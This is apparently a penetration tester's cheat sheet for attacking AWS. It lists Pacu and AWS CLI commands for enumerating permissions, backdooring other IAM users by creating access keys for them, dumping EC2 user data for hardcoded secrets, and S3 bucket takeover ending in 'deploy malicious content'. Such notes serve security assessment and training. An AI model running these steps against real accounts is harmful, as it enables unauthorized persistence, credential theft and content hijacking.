## General
### Access key and Secret key:
```
aws configure
aws configure --profile Test
aws sts get-caller-identity --profile Test
```

### PACU
```
import_keys Test
ls
whoami
run iam__enum_permissions
run aws__enum_spend
```

## Maintain persistence
Identify user with 0 or 1 access key (need iam:CreateAccessKey)
```
aws iam list-users --profile Test
aws iam list-access-keys --user-name Sarah --profile Test
aws iam create-access-key --user-name Sarah --profile Test
# Or run PACU command
run iam__backdoor_users_keys
```

## EC2
10.0.1.1 is reserved for the gateway of the subnet, 10.0.1.2 is
reserved for AWS DNS, and 10.0.1.3 is reserved for any future use by
AWS.

Look for hardcoded user data
```
run ec2__enum
run ec2__download_userdata
```
## S3
### awscli commands
```
aws s3 ls s3://kirit-bucket
aws s3 cp abc.txt s3://kirit-bucket/new/abc.txt
aws s3 rm s3://kirit-bucket/new/abc.txt --acl public-read
```

### NoSuchBucket message
- Check CNAME record for the bucket name
- Create S3 bucket with the same name and region
- Deploy malicious content

## Lambda
